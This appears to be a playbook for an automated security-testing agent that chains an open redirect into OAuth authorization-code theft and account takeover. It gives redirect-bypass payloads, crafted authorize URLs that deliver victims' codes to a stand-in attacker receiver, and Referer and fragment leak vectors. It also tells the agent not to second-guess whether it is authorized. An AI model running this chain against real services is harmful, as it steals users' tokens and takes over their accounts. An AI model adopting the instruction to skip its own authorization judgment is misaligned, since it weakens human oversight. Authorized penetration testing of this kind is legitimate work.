# C11_open_redirect_chain

Walk an open-redirect vulnerability through an OAuth callback hijack to steal an authorization code or access token from a victim. Standalone open redirects are not recordable as findings; this playbook converts them into a demonstrable token-theft chain. The full chain is: attacker-controlled `redirect_uri` or open-redirect parameter → OAuth provider redirects code to attacker → attacker exchanges code for victim's tokens. Scope is enforced by the daemon's egress proxy; the agent does not need to second-guess authorization for accepted targets.

---

## When to use

- Surface has an open-redirect parameter confirmed or suspected (`?url=`, `?next=`, `?return=`, `?redirect=`, `?goto=`, `?continue=`, `?target=`, `?redir=`).
- The target uses OAuth 2.0 and registers `redirect_uri` values that include the open-redirect endpoint.
- Traffic shows OAuth authorization flows with `redirect_uri` pointing to the target application.
- Bug-class hints include `open-redirect`, `oauth`, `token-theft`, or `redirect-uri-bypass`.

---

## Workflow

1. **Load assignment and map redirect parameters.**
   ```
   mantis_read_hunter_brief({ target_domain, wave, agent, egress_profile, block_internal_hosts })
   ```
   From traffic summary and recon, list all parameters and endpoints that perform client-side or server-side redirects.

2. **Confirm open-redirect primitive.**
   Test each parameter for open-redirect:
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/redirect?url=https://attacker-collab.example.com/redir-confirm", egress_profile })
   ```
   Observe the `Location` header. If it points to the attacker-controlled URL, the open-redirect is confirmed. Also test:
   - `//attacker.com` (protocol-relative)
   - `https:attacker.com` (colon without slashes)
   - `\attacker.com` (backslash)
   - `/%09/attacker.com` (tab-encoded slash)
   - `https://app.example.com@attacker.com` (authority confusion)
   Record the working bypass technique.

3. **Locate OAuth redirect_uri registration.**
   Check the OAuth authorization URL for a registered `redirect_uri` that includes the open-redirect endpoint:
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/auth/login", egress_profile })
   ```
   Parse the Location header for `redirect_uri=https://app.example.com/redirect%3Furl%3D...`. If the registered `redirect_uri` passes through the open-redirect endpoint, the chain is viable.

4. **Craft the chained OAuth URL.**
   Build an authorization URL where the `redirect_uri` is set to the open-redirect endpoint pointing to the attacker's receiver:
   ```
   /oauth/authorize?client_id=X&response_type=code&scope=openid+profile&redirect_uri=https://app.example.com/redirect%3Furl%3Dhttps://attacker-receiver.example.com/token-catch&state=random
   ```
   Send the victim (simulated via `auth_profile: "victim"`) through this URL:
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/oauth/authorize?client_id=...&redirect_uri=...", auth_profile: "victim", egress_profile })
   ```

5. **Confirm code delivery to attacker.**
   If the OAuth provider accepts the crafted `redirect_uri` (i.e. it passes its allowlist check because the registered base URI matches), the authorization code will land at the attacker's receiver as a query parameter:
   `https://attacker-receiver.example.com/token-catch?code=VICTIM_AUTH_CODE&state=random`
   Verify via collaborator callback or `mantis_http_scan` to the receiver endpoint.

6. **Referrer-based code leak (alternative vector).**
   If the OAuth provider appends the authorization code to the redirect URL before the open-redirect fires, the code may also appear in the `Referer` header of subsequent requests (if the redirect target loads external resources). Test:
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/redirect?url=https://attacker.com/leak", headers: { "Referer": "https://app.example.com/callback?code=REAL_CODE" }, egress_profile })
   ```

7. **Postmessage / fragment-based leak.**
   If the application uses `response_type=token` (implicit flow) or `response_type=fragment`, the token may be in the URL fragment. Confirm whether JavaScript on the redirect target can read `window.location.hash` after the fragment-carrying redirect.

8. **Log coverage.**
   ```
   mantis_log_coverage({ target_domain, wave, agent, surface_id, entries: [{ endpoint: "/redirect", method: "GET", bug_class: "open_redirect_oauth_chain", auth_profile: "victim", status: "promising"|"tested", evidence_summary: "Open redirect at /redirect confirms; OAuth code delivered to attacker receiver via redirect_uri chain" }] })
   ```

9. **Record chain attempt.**
   ```
   mantis_record_chain_attempt({ target_domain, wave, agent, surface_id, chain_id: "open-redirect-to-oauth-token-theft", step: "code_delivered_to_attacker", evidence: "Authorization code arrived at attacker receiver: code=VICTIM_AUTH_CODE", outcome: "finding_recorded" })
   ```

10. **Record finding.**
    Call `mantis_list_findings` first:
    ```
    mantis_record_finding({ target_domain, wave, agent, surface_id, auth_profile: "attacker", title: "Open redirect → OAuth callback hijack → authorization code theft", severity: "high", cwe: "CWE-601", endpoint: "/redirect (open redirect) + /oauth/authorize (OAuth flow)", description: "...", proof_of_concept: "<crafted URL + victim authorization + code arrival at attacker receiver>", response_evidence: "...", impact: "Attacker obtains victim's authorization code; exchanges for access/refresh tokens; account takeover", validated: true })
    ```

11. **Write handoff.**
    ```
    mantis_write_handoff({ target_domain, wave, agent, surface_id, surface_status: "complete"|"partial", summary: "...", chain_notes: ["Open-redirect OAuth chain confirmed; feeds C12 ATO", "Also viable as C7 redirect_uri bypass leg"] })
    ```

12. **Open verification attempt.**
    ```
    mantis_open_verification_attempt({ target_domain, wave, agent, surface_id, finding_id: "F-N", method: "chain_replay", notes: "Re-run full chain with fresh victim session; confirm code lands at attacker receiver" })
    ```

---

## Evidence requirements

Record via `mantis_record_finding`:
- Full open-redirect confirmation: request with crafted `url` parameter and Location header showing redirect to attacker URL.
- OAuth authorization URL with the crafted `redirect_uri` containing the open-redirect chain.
- Collaborator callback or receiver log entry showing the authorization `code` parameter arriving at the attacker-controlled endpoint.
- If token is exchanged: HTTP request to token endpoint and response confirming access token (truncate after 8 chars in the proof).
- The specific redirect bypass technique that passed the OAuth provider's `redirect_uri` allowlist check.

---

## Stop conditions

- OAuth provider validates `redirect_uri` against an exact-match allowlist; no bypass accepted.
- Open-redirect confirmed but no OAuth flow uses the same endpoint as a registered `redirect_uri`.
- Referrer policy (`no-referrer` or `origin`) prevents code leak via Referer header.
- Two WAF blocks on redirect parameter manipulation — log, mark WAF-blocked, stop.
- Budget at 140 turns — wrap current test, write handoff.

---

## Failure modes / false positives to avoid

- **Standalone open redirect.** Do not record an open redirect as a finding unless the OAuth chain is proven or a concrete phishing/session-fixation impact is demonstrated. The hunter-agent rules explicitly exclude standalone open redirects.
- **Same-origin redirect.** A redirect that stays on the same origin (e.g. `/dashboard`) is not an open redirect. The destination must be an external / attacker-controlled origin.
- **SameSite cookie and implicit flow.** Implicit flow token-theft via open redirect only works if the token appears in the URL before the redirect and the redirect target can read the fragment. Confirm fragment accessibility.
- **State parameter validation.** If the victim's browser validates the `state` parameter on return and rejects mismatches, the code cannot be injected into a victim session — but the code theft to the attacker's receiver is still valid without state injection.

---

## Next chain

Feeds into **C12_account_takeover** (exchange stolen code for tokens and take over victim account), **C7_oauth_state_pkce** (missing PKCE makes the stolen code exchangeable without the verifier), and **C8_csrf_to_sso** (use the open redirect as the SSO RelayState leg).
